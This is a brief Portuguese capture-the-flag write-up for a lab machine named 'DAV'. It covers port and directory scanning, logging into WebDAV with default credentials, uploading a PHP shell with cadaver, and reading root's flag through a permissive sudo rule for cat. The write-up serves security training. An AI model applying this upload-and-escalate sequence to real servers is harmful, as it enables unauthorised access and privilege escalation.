# DAV

* ### Scan de portas - Verificando quais portas estão abertas.

```bash
rustscan -a 10.10.237.217
```
![image](https://github.com/lufffe/Writeups/assets/90646635/931e3886-b1b6-4554-8b87-b5d4c334526c)

![image](https://github.com/lufffe/Writeups/assets/90646635/3a911bd7-88a0-4906-afe2-7385daa85660)

* ### Verificando o que está rodando nas portas encontradas.

```bash
nmap -A -p 80 10.10.237.217
```
![image](https://github.com/lufffe/Writeups/assets/90646635/073c9bf3-bf5d-45fd-b405-406d98260636)

* ### Scan de Arquivos e Diretórios.

```bash
gobuster dir -u http://10.10.237.217 -w common.txt -t 100 --no-error
```
![image](https://github.com/lufffe/Writeups/assets/90646635/1f054303-d0ac-4e23-9bb2-8da3c7338b5b)

* ### Verificando http
![image](https://github.com/lufffe/Writeups/assets/90646635/5cbc2ff0-d0a5-424d-839c-9aa7deb41826)

* ### Pesquisei sobre credenciais default do web
![image](https://github.com/lufffe/Writeups/assets/90646635/5259702b-ae86-471f-b8e5-2068049f761e)

```bash
  cadaver http://10.10.148.190/webdav
```
![image](https://github.com/lufffe/Writeups/assets/90646635/fe1b4a85-65de-4c34-84ae-661f7bf54c10)

```bash
dav:/webdav/> put shell.php
```
![image](https://github.com/lufffe/Writeups/assets/90646635/5b80fc83-444e-4e5a-8bc6-fa069f5bffb0)

![image](https://github.com/lufffe/Writeups/assets/90646635/fbadc8d3-1aa7-4d01-9ee5-c03198641def)

```bash
www-data@ubuntu:/home/merlin$ cat user.txt
```
>#########################################################

```bash
www-data@ubuntu:/home/merlin$ sudo -l
```
![image](https://github.com/lufffe/Writeups/assets/90646635/7271207b-0054-4a37-b593-2296a169d9d3)

```bash
www-data@ubuntu:/home/merlin$ sudo /bin/cat /root/root.txt
```
>#######################################################
